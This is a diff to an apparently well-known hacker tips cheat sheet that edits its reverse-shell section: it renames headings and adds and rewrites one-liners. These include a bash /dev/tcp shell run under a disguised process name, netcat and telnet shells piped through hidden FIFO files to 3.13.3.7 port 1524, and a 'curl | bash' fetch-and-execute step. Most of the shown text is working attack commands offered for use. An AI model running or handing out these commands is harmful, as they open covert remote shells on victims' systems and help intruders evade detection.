@@ -51,9 +51,9 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Reverse Shells](#reverse-shell)
       1. [with gs-netcat](#reverse-shell-gs-netcat)
       1. [with Bash](#reverse-shell-bash)
-      2. [with cURL](#curlshell)
-      1. [without Bash](#reverse-shell-no-bash)
-      1. [with remote.moe](#revese-shell-remote-moe)
+      2. [with cURL (encrypted)](#curlshell)
+      1. [without /dev/tcp](#reverse-shell-no-bash)
+      1. [with remote.moe (encrypted)](#revese-shell-remote-moe)
       1. [with Python](#reverse-shell-python)
       1. [with Perl](#reverse-shell-perl)
       1. [with PHP](#reverse-shell-php)
@@ -1113,7 +1113,7 @@ bash -c '(exec -a kqueue bash -i &>/dev/tcp/3.13.3.7/1524 0>&1) &'
 ```
 
 <a id="curlshell"></a>
-**5.i.c. Reverse shell with cURL**
+**5.i.c. Reverse shell with cURL (encrypted)**
 
 Use [curlshell](https://github.com/SkyperTHC/curlshell). This also works through proxies and when direct TCP connection to the outside world is prohibited:
 ```sh
@@ -1128,7 +1128,7 @@ curl -skfL https://1.2.3.4:8080 | bash
 ```
 
 <a id="reverse-shell-no-bash"></a>
-**5.i.d. Reverse shell without Bash**
+**5.i.d. Reverse shell without /dev/tcp**
 
 Embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:
 
@@ -1139,6 +1139,11 @@ nc -e /bin/bash -vn 3.13.3.7 1524
 ```
 
 Variant if *'-e'* is not supported:
+```sh
+{ nc -vn 3.13.3.7 1524 </dev/fd/3 3>&- | sh 2>&3 >&3 3>&- ; } 3>&1 | :
+```
+
+Variant for older */bin/sh*:
 ```sh
 mkfifo /tmp/.io
 sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
@@ -1152,14 +1157,13 @@ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 
 Telnet variant when mkfifo is not supported (Ulg!):
 ```sh
-(touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &
-tail -f /dev/shm/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/dev/shm/.fio
+({ touch /tmp/.fio; sleep 60; rm -f /tmp/.fio;} & )
+tail -f /tmp/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/tmp/.fio
 ```
-Note: Use */tmp/.fio* if */dev/shm* is not available.
-Note: This trick logs your commands to a file. The file will be *unlinked* from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
+Note: This trick logs your commands to a file. The file will be *unlinked* from the after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
 
 <a id="revese-shell-remote-moe"></a>
-**5.i.e. Reverse shell with remote.moe and ssh**
+**5.i.e. Reverse shell with remote.moe and ssh (encrypted)**
 
 It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](https://remote.moe):
 
